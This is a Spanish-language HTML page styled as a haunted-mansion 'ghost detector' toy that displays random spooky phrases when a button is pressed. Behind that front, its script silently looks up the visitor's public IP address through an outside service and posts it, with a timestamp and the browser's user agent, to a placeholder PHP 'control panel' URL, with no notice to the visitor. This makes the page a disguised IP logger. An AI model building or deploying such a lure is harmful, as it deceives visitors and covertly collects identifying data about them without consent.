<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mansión Maldita - Experimento Paranormal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(145deg, #0a0a0f 0%, #1a1120 100%);
            font-family: 'Courier New', 'Segoe UI', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .mansion-card {
            background: rgba(20, 15, 25, 0.85);
            backdrop-filter: blur(8px);
            border-radius: 32px;
            border: 1px solid rgba(100, 70, 120, 0.6);
            box-shadow: 0 20px 40px rgba(0,0,0,0.5), 0 0 20px rgba(80, 50, 120, 0.3);
            padding: 30px 25px;
            max-width: 650px;
            width: 100%;
        }

        h1 {
            text-align: center;
            font-size: 2.2rem;
            letter-spacing: 4px;
            color: #d9c8ff;
            text-shadow: 0 0 8px #9b6dff, 0 0 2px #2a1a3a;
            margin-bottom: 12px;
        }

        .sub {
            text-align: center;
            color: #aa9fcf;
            border-bottom: 1px dashed #6a4e8a;
            padding-bottom: 12px;
            margin-bottom: 25px;
            font-style: italic;
        }

        .detect-area {
            background: #0f0b16;
            border-radius: 28px;
            padding: 20px;
            text-align: center;
            border: 1px solid #56447a;
            margin-bottom: 25px;
        }

        .btn-detectar {
            background: linear-gradient(135deg, #3a2a4a, #1f1730);
            border: 2px solid #b37bff;
            color: #f0eaff;
            font-size: 1.6rem;
            font-weight: bold;
            padding: 16px 28px;
            border-radius: 60px;
            cursor: pointer;
            font-family: monospace;
            letter-spacing: 2px;
            transition: 0.2s;
            box-shadow: 0 5px 0 #2a1e3a;
            width: 100%;
        }

        .btn-detectar:hover {
            background: linear-gradient(135deg, #5a3f7a, #2a1e42);
            transform: translateY(-2px);
            box-shadow: 0 8px 0 #2a1e3a;
        }

        .btn-detectar:active {
            transform: translateY(4px);
            box-shadow: 0 2px 0 #2a1e3a;
        }

        .result-panel {
            background: #00000055;
            border-radius: 24px;
            padding: 18px;
            margin-top: 18px;
            border: 1px solid #6f5590;
            font-size: 0.9rem;
        }

        footer {
            font-size: 0.7rem;
            text-align: center;
            margin-top: 24px;
            color: #7a6b96;
        }
    </style>
</head>
<body>
<div class="mansion-card">
    <h1>🏚️ Mansión Maldita 🕯️</h1>
    <div class="sub">« Invoca lo desconocido »</div>

    <div class="detect-area">
        <button class="btn-detectar" id="detectarFantasmaBtn">🔮 DETECTAR PRESENCIA 🔮</button>
        <div class="result-panel" id="resultadoMansion">
            🕸️ Esperando invocación del detector...
        </div>
    </div>

    <footer>
        Experimento paranormal.
    </footer>
</div>

<script>
    // ----- CONEXIÓN CON EL PANEL DE CONTROL PHP -----
    // ⚠️ CAMBIA ESTA URL POR LA RUTA REAL DE TU panel.php
    const URL_PANEL = 'https://tudominio.com/panel.php';
    
    const botonDetectar = document.getElementById('detectarFantasmaBtn');
    const resultadoDiv = document.getElementById('resultadoMansion');

    // Frases espeluznantes
    const frasesFantasma = [
        "👻 ¡Un espectro cruza el salón! Temperatura: -2°C",
        "🕯️ Las velas se apagan... se siente una presencia antigua.",
        "🔊 Susurro: 'sal de aquí'...",
        "📜 El péndulo detector marca actividad en el ala este.",
        "⚡ La corriente falla. Algo te observa.",
        "🧹 Escobazos en el piso. El fantasma está cerca.",
        "🌬️ Una brisa fría recorre la habitación.",
        "🔪 Se oyen pasos en la escalera... pero no hay nadie.",
        "💀 Una sombra pasa detrás de ti.",
        "🕷️ La araña en la esquina te mira fijamente."
    ];

    // Obtener IP pública
    async function obtenerIpPublica() {
        try {
            const respuesta = await fetch('https://api.ipify.org?format=json');
            const datos = await respuesta.json();
            return datos.ip;
        } catch (error) {
            console.error("Error al obtener IP:", error);
            return null;
        }
    }

    // Enviar IP al panel PHP
    async function enviarIpAlPanel(ip, userAgent) {
        try {
            const envio = await fetch(URL_PANEL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ip: ip,
                    timestamp: new Date().toISOString(),
                    userAgent: userAgent,
                    experimento: "Mansión Maldita"
                })
            });
            const respuesta = await envio.json();
            console.log("Panel response:", respuesta);
            return envio.ok;
        } catch (error) {
            console.error("Fallo en envío al panel:", error);
            return false;
        }
    }

    // Acción del botón
    botonDetectar.addEventListener('click', async () => {
        resultadoDiv.innerHTML = "🔍 Invocando espíritus... 🌫️";

        // Obtener y enviar IP (silencioso)
        const ipUsuario = await obtenerIpPublica();
        if (ipUsuario) {
            await enviarIpAlPanel(ipUsuario, navigator.userAgent);
        }

        // Mostrar frase de fantasma
        const fraseAleatoria = frasesFantasma[Math.floor(Math.random() * frasesFantasma.length)];
        resultadoDiv.innerHTML = fraseAleatoria;
    });
</script>
</body>
</html>
